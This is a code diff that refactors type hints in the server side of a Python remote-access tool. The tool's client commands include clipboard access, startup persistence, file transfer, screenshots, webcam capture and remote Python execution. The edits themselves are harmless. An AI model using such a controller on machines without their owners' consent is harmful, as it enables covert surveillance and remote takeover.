@@ -9,7 +9,7 @@ import threading
 import time
 import traceback
 from datetime import datetime
-from typing import Tuple
+from typing import Tuple, Union
 from queue import Empty, Queue
 
 from cryptography.fernet import Fernet
@@ -160,13 +160,13 @@ class Client():
         self.send_json(['PASTE'])
         return tuple(self.recv_json())
 
-    def fill_clipboard(self, data: str) -> Tuple[bool, str]:
+    def fill_clipboard(self, data: str) -> Tuple[bool, Union[str, None]]:
         """ Copy to Client Clipboard"""
         # returns True/False, None/error
         self.send_json(['COPY', data])
         return tuple(self.recv_json())
 
-    def download(self, url: str, file_name: str) -> Tuple[bool, str]:
+    def download(self, url: str, file_name: str) -> Tuple[bool, Union[str, None]]:
         """ Download File To Client """
         # returns True/False, None/error
         self.send_json(['DOWNLOAD', url, file_name])
@@ -199,13 +199,13 @@ class Client():
         self.receive()
         self.conn.close()
 
-    def add_startup(self) -> Tuple[bool, str]:
+    def add_startup(self) -> Tuple[bool, Union[str, None]]:
         """ Add Client to Startup """
         # returns True/False, None/error
         self.send_json(['ADD_STARTUP'])
         return tuple(self.recv_json())
 
-    def remove_startup(self) -> Tuple[bool, str]:
+    def remove_startup(self) -> Tuple[bool, Union[str, None]]:
         """ Remove Client from Startup """
         # returns True/False, None/error
         self.send_json(['REMOVE_STARTUP'])
@@ -229,7 +229,7 @@ class Client():
         self.send_json(['RESTART'])
         return self.recv_json()
 
-    def send_file(self, file_to_transfer: str, save_as: str) -> None:
+    def send_file(self, file_to_transfer: str, save_as: str) -> Tuple[bool, Union[str, None]]:
         """ Send file from Server to Client """
         # returns True/False, None/error
         if not os.path.isfile(file_to_transfer):
@@ -246,7 +246,7 @@ class Client():
         self.receive()
         return True, None
 
-    def receive_file(self, file_to_transfer: str, save_as: str) -> None:
+    def receive_file(self, file_to_transfer: str, save_as: str) -> Tuple[bool, Union[str, None]]:
         """ Transfer file from Client to Server """
         # returns True/False, None/error
         self.send_json(['RECEIVE_FILE', file_to_transfer])
@@ -264,7 +264,7 @@ class Client():
         self.receive()
         return True, None
 
-    def screenshot(self, save_as: str = None) -> Tuple[bool, str]:
+    def screenshot(self, save_as: str = None) -> Tuple[bool, Union[str, None]]:
         """ Take screenshot on Client """
         # returns True/False, None/error
         if not save_as:
@@ -278,7 +278,7 @@ class Client():
             f.write(data)
         return True, save_as
 
-    def webcam(self, save_as: str = None) -> Tuple[bool, str]:
+    def webcam(self, save_as: str = None) -> Tuple[bool, Union[str, None]]:
         """ Capture webcam """
         # returns True/False, save_as/None
         if not save_as:
@@ -291,7 +291,7 @@ class Client():
             f.write(data)
         return True, save_as
 
-    def exec(self, command: str) -> Tuple[str, str]:
+    def exec(self, command: str) -> Tuple[str, Union[str, None]]:
         """ Remote Python Interpreter """
         # returns command_output, error/None
         self.send_json(['EXEC', command])
@@ -374,19 +374,19 @@ class Client():
             print(info)
         return info
 
-    def zip_file(self, zip_filename: str, file_to_zip: str) -> Tuple[bool, str]:
+    def zip_file(self, zip_filename: str, file_to_zip: str) -> Tuple[bool, Union[str, None]]:
         """ Zip a Single File """
         # returns True/False, None/error
         self.send_json(['ZIP_FILE', zip_filename, file_to_zip])
         return tuple(self.recv_json())
 
-    def zip_dir(self, zip_filename: str, dir_to_zip: str) -> Tuple[bool, str]:
+    def zip_dir(self, zip_filename: str, dir_to_zip: str) -> Tuple[bool, Union[str, None]]:
         """ Zip a Directory """
         # returns True/False, None/error
         self.send_json(['ZIP_DIR', os.path.splitext(zip_filename)[0], dir_to_zip])
         return tuple(self.recv_json())
 
-    def unzip(self, zip_filename: str) -> Tuple[bool, str]:
+    def unzip(self, zip_filename: str) -> Tuple[bool, Union[str, None]]:
         """ Unzip a File """
         # returns True/False, None/error
         self.send_json(['UNZIP', zip_filename])
@@ -422,7 +422,7 @@ class Server():
         while not self.event.is_set():
             try:
                 conn, address = self.socket.accept()
-                conn.setblocking(1)
+                conn.setblocking(True)
 
                 hostname = conn.recv(4096).decode()
                 address = address + (hostname,)
@@ -559,7 +559,7 @@ class ServerCLI(Server):
                 break
             client.shell(command)
 
-    def selector(self, client: Client, command: str) -> bool or None:
+    def selector(self, client: Client, command: str) -> Union[bool, None]:
         """ Command selector interface """
         # returns True/None
         commands = command.lower().split(' ')
